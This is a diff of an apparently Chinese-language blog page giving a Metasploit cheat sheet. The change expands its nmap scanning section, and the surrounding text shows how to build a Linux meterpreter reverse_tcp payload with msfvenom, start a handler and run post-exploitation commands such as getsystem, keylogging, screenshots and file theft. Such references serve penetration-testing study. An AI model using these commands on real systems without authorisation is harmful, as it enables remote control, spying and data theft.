@@ -28,10 +28,11 @@
 <meta property="og:description" content="開啟 Metasploit Console 1msfconsole">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-06-01T20:10:00.000Z">
-<meta property="article:modified_time" content="2024-06-02T08:49:52.712Z">
+<meta property="article:modified_time" content="2024-06-03T14:02:15.744Z">
 <meta property="article:author" content="Stephen">
 <meta property="article:tag" content="Security">
 <meta property="article:tag" content="Metasploit">
+<meta property="article:tag" content="Nmap">
 <meta name="twitter:card" content="summary">
 
 
@@ -166,7 +167,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-count">47</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -265,7 +266,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-06-02 08:49:52" itemprop="dateModified" datetime="2024-06-02T08:49:52+00:00">2024-06-02</time>
+      <time title="Modified: 2024-06-03 14:02:15" itemprop="dateModified" datetime="2024-06-03T14:02:15+00:00">2024-06-03</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -284,14 +285,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>667</span>
+      <span>750</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>2 mins.</span>
+      <span>3 mins.</span>
     </span>
 </div>
 
@@ -308,7 +309,7 @@
 <h1 id="初始化-PostgreSQL-資料庫"><a class="header-anchor" href="#初始化-PostgreSQL-資料庫"></a>初始化 PostgreSQL 資料庫</h1>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化資料庫</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查詢資料庫狀態</span></span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
 <h1 id="nmap-掃描"><a class="header-anchor" href="#nmap-掃描"></a>nmap 掃描</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基礎掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎漏洞掃描</span></span><br><span class="line">db_nmap -sV --script vulners [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># vulners.com 線上漏洞掃描</span></span><br><span class="line">db_nmap -sV --script vulners [IP]</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 網段主機掃描</span></span><br><span class="line">db_nmap -sn [CIDR網段]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有端口</span></span><br><span class="line">db_nmap [IP] -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口</span></span><br><span class="line">db_nmap [IP] -p [端口]</span><br><span class="line">db_nmap [IP] -p [起始端口]-[結束端口]</span><br><span class="line">db_nmap [IP] -p [端口1],[端口2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎服務掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># OS 識別</span></span><br><span class="line">db_nmap [IP] -p [端口] -O</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎漏洞掃描</span></span><br><span class="line">db_nmap -sV --script vulners [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># vulners.com 線上漏洞掃描</span></span><br><span class="line">db_nmap -sV --script vulners [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掃描結果導出</span></span><br><span class="line">db_nmap [IP] -p [端口] -oN result.txt</span><br><span class="line">db_nmap [IP] -p [端口] -oX result.xml</span><br></pre></td></tr></table></figure>
 <h1 id="模組操作"><a class="header-anchor" href="#模組操作"></a>模組操作</h1>
 <p>⭐ 更新可用模組</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
@@ -319,11 +320,11 @@
 <p>⭐ 模組使用</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 載入模組</span></span><br><span class="line">use [模組路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模組詳情</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置參數</span></span><br><span class="line"><span class="built_in">set</span> [參數名] [參數值]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看當前配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 啟動</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 <h1 id="payload-基本操作"><a class="header-anchor" href="#payload-基本操作"></a>payload 基本操作</h1>
-<p>⭐ 用途介紹</p>
+<p>⭐ 接口介紹</p>
 <table>
 <thead>
 <tr>
-<th style="text-align:left">用途</th>
+<th style="text-align:left">接口</th>
 <th style="text-align:left">說明</th>
 </tr>
 </thead>
@@ -344,9 +345,9 @@
 </table>
 <p>⭐ 創建 meterpreter payload :</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
-<p>⭐ 監聽 payload ，等待遠端執行 payload</p>
+<p>⭐ 啟動監聽服務，等待遠端執行 meterpreter payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST [監聽機IP位置]</span><br><span class="line"><span class="built_in">set</span> LPORT [監聽機端口]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p>⭐ 遠端執行 payload</p>
+<p>⭐ 遠端執行 meterpreter payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 給予執行權限</span></span><br><span class="line"><span class="built_in">chmod</span> +x payload.elf</span><br><span class="line"><span class="comment"># 執行 payload</span></span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
 <h1 id="後滲透操作-取得shell後"><a class="header-anchor" href="#後滲透操作-取得shell後"></a>後滲透操作(取得shell後)</h1>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出當前活動會話</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 連接到一個會話</span></span><br><span class="line">sessions -i [會話ID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取使用者信息</span></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">getsystem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取shell</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍵盤記錄</span></span><br><span class="line">keyscan_start、keyscan_stop、keyscan_dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕截圖:</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上傳文件、下載文件</span></span><br><span class="line">download [遠程文件路徑] [本地目標路徑]</span><br><span class="line">upload [本地文件路徑] [遠程目標路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行命令</span></span><br><span class="line">execute -f [可執行文件] -H</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隱藏進程在其他進程中</span></span><br><span class="line">migrate -N [程式]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網絡偵查</span></span><br><span class="line">run packetrecorder、run arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當前 session 放置背景執行</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
@@ -382,6 +383,7 @@
           <div class="post-tags">
               <a href="/tags/Security/" rel="tag"># Security</a>
               <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
+              <a href="/tags/Nmap/" rel="tag"># Nmap</a>
           </div>
 
         
